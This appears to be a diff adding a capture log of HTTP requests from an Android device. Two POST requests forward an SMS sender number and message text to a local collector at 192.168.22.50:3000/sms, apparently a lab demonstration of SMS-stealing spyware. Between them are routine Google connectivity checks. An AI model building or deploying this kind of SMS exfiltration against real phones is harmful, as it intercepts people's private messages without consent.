@@ -1,0 +1,118 @@
+URL: http://192.168.22.50:3000/sms
+Headers:
+	Accept-Charset: UTF-8
+	Content-Type: application/x-www-form-urlencoded
+	User-Agent: Dalvik/2.1.0 (Linux; U; Android VanillaIceCream Build/AP31.240426.022.B1)
+	Host: 192.168.22.50:3000
+	Connection: Keep-Alive
+	Accept-Encoding: gzip
+	Content-Length: 49
+Body: SMSText=%2B9449334323-Your_data_is_being_captured
+
+URL: http://connectivitycheck.gstatic.com/generate_204
+Headers:
+	Connection: close
+	User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.32 Safari/537.36
+	Host: connectivitycheck.gstatic.com
+	Accept-Encoding: gzip
+Body: 
+
+URL: http://connectivitycheck.gstatic.com/generate_204
+Headers:
+	Connection: close
+	User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.32 Safari/537.36
+	Host: connectivitycheck.gstatic.com
+	Accept-Encoding: gzip
+Body: 
+
+URL: http://play.googleapis.com/generate_204
+Headers:
+	Connection: close
+	User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.32 Safari/537.36
+	Host: play.googleapis.com
+	Accept-Encoding: gzip
+Body: 
+
+URL: http://www.google.com/gen_204
+Headers:
+	Connection: close
+	User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.32 Safari/537.36
+	Host: www.google.com
+	Accept-Encoding: gzip
+Body: 
+
+URL: http://connectivitycheck.gstatic.com/generate_204
+Headers:
+	Connection: close
+	User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.32 Safari/537.36
+	Host: connectivitycheck.gstatic.com
+	Accept-Encoding: gzip
+Body: 
+
+URL: http://connectivitycheck.gstatic.com/generate_204
+Headers:
+	Connection: close
+	User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.32 Safari/537.36
+	Host: connectivitycheck.gstatic.com
+	Accept-Encoding: gzip
+Body: 
+
+URL: http://www.google.com/gen_204
+Headers:
+	Connection: close
+	User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.32 Safari/537.36
+	Host: www.google.com
+	Accept-Encoding: gzip
+Body: 
+
+URL: http://www.google.com/gen_204
+Headers:
+	Connection: close
+	User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.32 Safari/537.36
+	Host: www.google.com
+	Accept-Encoding: gzip
+Body: 
+
+URL: http://connectivitycheck.gstatic.com/generate_204
+Headers:
+	Connection: close
+	User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.32 Safari/537.36
+	Host: connectivitycheck.gstatic.com
+	Accept-Encoding: gzip
+Body: 
+
+URL: http://connectivitycheck.gstatic.com/generate_204
+Headers:
+	Connection: close
+	User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.32 Safari/537.36
+	Host: connectivitycheck.gstatic.com
+	Accept-Encoding: gzip
+Body: 
+
+URL: http://www.google.com/gen_204
+Headers:
+	Connection: close
+	User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.32 Safari/537.36
+	Host: www.google.com
+	Accept-Encoding: gzip
+Body: 
+
+URL: http://play.googleapis.com/generate_204
+Headers:
+	Connection: close
+	User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.32 Safari/537.36
+	Host: play.googleapis.com
+	Accept-Encoding: gzip
+Body: 
+
+URL: http://192.168.22.50:3000/sms
+Headers:
+	Accept-Charset: UTF-8
+	Content-Type: application/x-www-form-urlencoded
+	User-Agent: Dalvik/2.1.0 (Linux; U; Android VanillaIceCream Build/AP31.240426.022.B1)
+	Host: 192.168.22.50:3000
+	Connection: Keep-Alive
+	Accept-Encoding: gzip
+	Content-Length: 49
+Body: SMSText=%2B9449334323-Your_data_is_being_captured
+
